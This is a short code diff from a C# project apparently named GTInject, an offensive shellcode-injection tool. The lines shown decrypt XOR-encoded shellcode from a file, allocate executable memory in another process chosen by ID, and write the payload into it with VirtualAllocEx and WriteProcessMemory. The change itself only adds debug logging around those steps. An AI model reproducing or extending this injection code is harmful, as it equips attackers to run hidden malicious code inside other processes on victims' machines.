@@ -32,14 +32,15 @@ namespace GTInject.memoryOptions
             var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
                 
             Process pid = Process.GetProcessById(ProcID);
+            Console.WriteLine( " have pid " + pid.Id + " " + pid);
             IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
-
+            Console.WriteLine(  " allocated mem at address " + vMemAddr);
             IntPtr outsize;
             var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically
 
             if (writeResp)
             {
-                Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs");
+                Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs: " + writeResp);
                 return (vMemAddr, pid);
             }
             else
